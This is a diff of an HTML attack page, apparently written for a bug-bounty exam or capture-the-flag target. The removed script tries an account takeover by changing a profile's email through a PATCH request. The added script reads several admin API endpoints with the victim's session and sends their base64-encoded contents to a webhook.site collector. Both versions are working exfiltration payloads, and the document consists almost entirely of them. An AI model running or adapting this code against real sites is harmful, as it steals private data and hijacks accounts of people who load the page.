@@ -5,36 +5,29 @@
 </head>
 <body>
     <script>
-        // Use the Admin ID you found earlier
-        const adminId = "69d28e841cda77b519a9550e"; 
-        const webhook = "https://webhook.site/9179081b-61f3-42f5-823e-1d611bf431c3";
+      async function findFlag() {
+    const webhook = "https://webhook.site/9c58164d-24e0-4e24-bb41-8742b6e95e5e";
+    
+    // List of likely endpoints for a 1000pt flag
+    const targets = [
+        '/api/admin/flag',
+        '/api/admin/stats',
+        '/api/auth/me',
+        '/api/admin/settings'
+    ];
 
-        async function triggerATO() {
-            try {
-                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile', {
-                    method: 'PATCH',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    // Attempting to change the name to the flag indicator 
-                    // and changing the email to one you control (if the API allows it)
-                    body: JSON.stringify({
-                        "fullName": "Pwned_Admin_Flag",
-                        "email": "ladybughunter1@gmail.com" 
-                    })
-                });
-
-                const data = await response.json();
-                
-                // Report back to your webhook with the response data
-                fetch(`${webhook}?status=success&data=${btoa(JSON.stringify(data))}`);
-            } catch (err) {
-                // If it fails (e.g., CSP or CORS), report the error
-                fetch(`${webhook}?status=error&msg=${btoa(err.message)}`);
-            }
+    for (let url of targets) {
+        try {
+            let response = await fetch(url);
+            let text = await response.text();
+            // Send whatever we find back to the webhook
+            fetch(`${webhook}?path=${btoa(url)}&content=${btoa(text)}`);
+        } catch (e) {
+            // Skip failed attempts
         }
-
-        triggerATO();
+    }
+}
+findFlag();
     </script>
 </body>
 </html>
